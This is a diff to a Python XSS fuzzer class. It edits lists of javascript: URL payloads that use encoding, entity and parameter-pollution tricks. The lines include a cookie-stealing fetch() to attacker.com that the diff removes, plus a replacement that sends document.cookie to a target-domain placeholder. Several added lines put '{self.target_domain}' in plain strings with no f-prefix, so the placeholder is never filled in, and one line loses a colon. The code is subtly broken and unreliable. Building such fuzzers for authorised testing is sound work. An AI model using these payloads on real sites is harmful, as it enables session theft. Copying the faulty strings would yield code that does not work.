@@ -116,7 +116,7 @@ class JavaScriptProtocolFuzzer:
             "javascript:alert(1)",
             "javascript:alert('XSS')",
             "javascript:alert(document.cookie)",
-            "javascript:fetch('https://attacker.com?cookie='+document.cookie)",
+            "javascript:fetch('https://{self.target_domain}?cookie='+document.cookie)",
             "javascript:eval('alert(1)')",
             "javascript:confirm('XSS')",
             "javascript:prompt('XSS')"
@@ -213,13 +213,13 @@ class JavaScriptProtocolFuzzer:
         
         # URL fragment and query tricks
         fragment_tricks = [
-            f"https://www.{self.target_domain}#javascript:alert(1)",
-            f"https://www.{self.target_domain}/#javascript:alert(1)",
-            f"https://www.{self.target_domain}/?x=javascript:alert(1)",
-            f"https://www.{self.target_domain}/%0Ajavascript:alert(1)",
-            f"https://www.{self.target_domain}/%23javascript:alert(1)",
-            f"https://www.{self.target_domain}/%3Fjavascript:alert(1)",
-            f"https://www.{self.target_domain}/%26javascript:alert(1)"
+            f"https://{self.target_domain}#javascript:alert(1)",
+            f"https://{self.target_domain}/#javascript:alert(1)",
+            f"https://{self.target_domain}/?x=javascript:alert(1)",
+            f"https://{self.target_domain}/%0Ajavascript:alert(1)",
+            f"https://{self.target_domain}/%23javascript:alert(1)",
+            f"https://{self.target_domain}/%3Fjavascript:alert(1)",
+            f"https://{self.target_domain}/%26javascript:alert(1)"
         ]
         
         # Protocol confusion
@@ -291,7 +291,7 @@ class JavaScriptProtocolFuzzer:
             "javascript:\ralert(1)",
             # Path/host confusion
             f"javascript://{self.target_domain}/%0Aalert(1)",
-            "javascript://user@evil.com:alert(1)",
+            "javascript://user@{self.target_domain}alert(1)",
             # Exotic HTML entities
             "javascript&#58;alert(1)",
             "javascript&#x3A;alert(1)",
@@ -300,7 +300,7 @@ class JavaScriptProtocolFuzzer:
             "javascri\u0301pt:alert(1)", # i + combining acute accent
             # Parameter pollution
             "?redirect=javascript:alert(1)&redirect=https://safe.com",
-            "?redirect=https://safe.com&redirect=javascript:alert(1)",
+            "?redirect=https://{self.target_domain}&redirect=javascript:alert(1)",
             # Exotic browser/server quirks
             "javascript`alert(1)",
             "javascript:\u00A0alert(1)",
